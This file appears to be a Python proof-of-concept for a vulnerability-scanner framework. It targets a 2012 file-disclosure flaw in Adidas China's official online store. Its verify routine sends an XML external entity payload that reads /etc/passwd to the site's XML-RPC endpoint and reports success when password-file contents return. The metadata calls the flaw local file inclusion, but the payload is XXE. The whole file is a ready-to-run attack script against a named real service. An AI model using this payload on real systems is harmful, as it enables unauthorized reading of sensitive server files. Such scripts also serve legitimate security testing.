# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Adidas_0101' # 平台漏洞编号
    name = '阿迪达斯中国官方旗舰店本地文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2012-08-20'  # 漏洞公布时间
    desc = '''模版漏洞描述
    阿迪达斯中国官方旗舰店本地文件包含，攻击者可以通过本地文件包含来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=9302
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Adidas'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '27a11616-e63d-4d3c-92a6-21a30bafafbf' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-12' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '''
            <?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT methodName ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<methodCall>
<methodName>&xxe;</methodName>
</methodCall>'''
            url = self.target + "/api/Xmlrpc/index/"
            headers = {
                "Content-Length":"234",
                "Content-Type":"text/xml",
                "Accept-Encoding":"gzip, deflate",
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36',
            }
            respone = requests.post(url, headers=headers,data=payload)
            if "root" in respone.text or "/bin/bash" in respone.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
